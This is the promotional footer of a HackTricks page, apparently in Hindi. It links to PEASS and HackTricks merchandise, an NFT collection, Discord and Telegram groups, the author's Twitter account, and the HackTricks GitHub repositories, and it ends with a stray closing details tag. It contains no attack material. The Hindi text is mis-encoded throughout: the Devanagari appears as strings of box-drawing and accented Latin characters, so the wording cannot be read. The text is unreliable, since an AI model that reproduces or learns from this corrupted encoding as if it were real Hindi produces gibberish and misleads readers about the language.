* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
